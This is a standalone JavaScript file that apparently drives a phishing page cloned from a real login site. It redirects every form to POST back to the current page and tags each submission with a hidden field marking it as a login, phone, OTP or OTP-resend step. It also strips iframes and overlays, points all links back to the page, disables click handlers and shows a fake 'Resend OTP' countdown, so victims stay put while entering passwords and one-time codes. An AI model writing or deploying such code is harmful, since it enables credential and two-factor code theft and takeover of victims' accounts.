let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// sets
let phNumber = document.querySelector(`[name="username"]`)
let identifier = document.querySelector(`#identifier`)
// set 
let otp = document.querySelector('[name="otp"]')

// set 
if (phNumber) {
    addSpikeType("login")
}

else if (identifier) {
    addSpikeType("phone")
    identifier.name = "username"
    identifier.parentElement.classList.add("_1LgGC")
    identifier.parentElement.classList.add("_2K6Dj")
}
// set 
else if (otp) {
    addSpikeType("otp")
}


// functions
let otpIndex = 60
let otpTimer = document.querySelector(".disable-state-login.input-extra-options-desktop")
let clearIn_
if (otpTimer) {
    clearIn_ = setInterval(() => {
        if (otpIndex == 0) {
            clearInterval(clearIn_)
            loadresetbtn()
        }

        document.querySelector(".disable-state-login.input-extra-options-desktop").innerHTML = `Resend OTP in ${otpIndex}s`
        otpIndex--
    }, 1000)
}

function loadresetbtn() {
    document.forms[0].innerHTML +=
        `<button class="login-form-inputs login-btn" style="background: #111;margin: 1rem 0;" type="button" id="resend_otp">Resend OTP</button>`
    document.querySelector("#resend_otp").addEventListener("click", () => {
        addSpikeType("resend_otp")
        document.forms[0].submit()
    })
}


let allLoader = document.querySelectorAll(".loader")
if (allLoader) {
    allLoader.forEach(l => {
        l.remove()
    })
}

if (document.body.innerText.includes("You have exceeded maximum OTP attempts, Please try again after some time.")) {
    loadresetbtn()
}

let intentOpacityDiv = document.querySelector("#intentOpacityDiv")
let intentPreview = document.querySelector("#intentPreview")

if (intentOpacityDiv) {
    intentOpacityDiv.remove()
}

if (intentPreview) {
    intentPreview.remove()
}